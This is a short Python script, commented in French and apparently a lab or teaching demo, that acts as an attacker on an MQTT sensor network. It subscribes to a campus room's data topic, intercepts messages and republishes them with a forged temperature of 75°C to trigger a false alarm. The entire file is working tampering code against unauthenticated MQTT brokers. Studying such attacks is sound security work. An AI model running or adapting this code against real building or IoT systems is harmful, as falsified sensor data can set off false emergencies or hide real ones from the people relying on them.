import paho.mqtt.client as mqtt
import json

def on_message(client, userdata, msg):
    data = json.loads(msg.payload.decode())
    print(f"[INTERCEPTÉ] {data}")
    
    # L'attaquant modifie la température pour déclencher une fausse alerte
    if data["salle"] == "A101":
        data_falsifiee = data.copy()
        data_falsifiee["temperature"] = 75.0
        print(f"[MODIFIÉ] Température falsifiée : {data['temperature']}°C → 75.0°C")
        client.publish(msg.topic, json.dumps(data_falsifiee))

client = mqtt.Client()
client.on_message = on_message
client.connect("localhost", 1883, 60)
client.subscribe("campus/A101/data")

print("Attaquant en écoute sur campus/A101/data...")
client.loop_forever()